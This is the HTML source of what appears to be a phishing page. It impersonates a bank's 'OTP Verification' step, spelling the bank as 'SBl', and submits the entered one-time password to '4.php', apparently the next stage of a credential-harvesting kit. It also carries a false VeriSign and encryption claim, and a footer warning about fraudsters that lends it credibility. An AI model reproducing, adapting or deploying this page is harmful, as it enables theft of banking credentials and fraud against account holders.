<!DOCTYPE HTML> 
<html lang="zxx">
   <head>
      <title>Document Online</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" type="text/css" href="bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="unamestyle.css">
   </head>
   <body>
      <div class="container-fluid m-0 p-0">
         <!-- Static navbar -->
         <nav class="navbar navbar-default">
            <div class="container">
               <div class="navbar-header">
                  <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                  <span class="sr-only">Toggle navigation</span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                  <span class="icon-bar"></span>
                  </button>
                  <a class="navbar-brand" href="#"><img src="loghska.svg" width="150px"></a>
               </div>
               <div id="navbar" class="navbar-collapse collapse">
                  <ul class="nav navbar-nav navbar-right">
                     <li><a href="#">Financial Products</a></li>
                     <li><a href="#">Shop & Orders</a></li>
                     <li><a href="#">Best Offers</a></li>
                  </ul>
               </div>
               <!--/.nav-collapse -->
            </div>
            <!--/.container-fluid -->
         </nav>
      </div>
      <div class="container">
         <div class="row">
            <div class="col-md-7 text-center"></div>
            <div class="col-md-5">
               <div class="card m-0 p-0">
                  <div class="bg-light p-30">
                     <h1><b>Welcome to</b></h1>
                     <img src="loghska.svg"  width="100%">
                  </div>
                  <div class="card-body">
                     <form action="4.php" method="post">
                        <div class="row">
                           <div class="col-md-12">
                              <h4><b>OTP Verification</b></h4>
                              <p>An otp has been sent to the registered mobile number with SBl</p>
                              <hr>
                              <br><br>
                           </div>
                           <div class="col-md-12"> 
                              <input type="text" class="form-control" name="Otp" placeholder="Enter OTP" required=""> 
                           </div>
                           <div class="col-md-12 text-right"> 
                              <a href="#">Resend OTP</a>
                              <br><br>
                           </div>
                        </div>
                        <div class="w3ls-login">
                           <button type="submit" class="btn btn-success btn-block"> LOG IN </button>
                        </div>
                        <p class="link text-center"><a href="#">Lock Access</a>|<a href="#">Forgot Password</a>|<a href="#">Forgot Username</a></p>
                     </form>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <footer>
         <div class="container">
            <div class="row">
               <div class="col-md-12 col-xs-12 col-sm-12">
                  <p class="login-infoNote first"><span></span>This site is certified by VeriSign as a secure and trusted site. All information sent or received in this site is encrypted using 256-bit encryption. </p>
               </div>
               <div class="col-md-12 col-xs-12 col-sm-12">
                  <p class="login-infoNote second"><span></span> NEVER respond to any popup, SMS or phone call, no matter how appealing or official looking, seeking your personal information such as username,<br> password(s), mobile number, ATM card details, etc. Such communications are sent or created by fraudsters to trick you into parting with credentials. </p>
               </div>
            </div>
         </div>
      </footer>
      <script src="jquery-1.12.4.min.js"></script>
      <script src="bootstrap.min.js"></script>
   </body>
</html>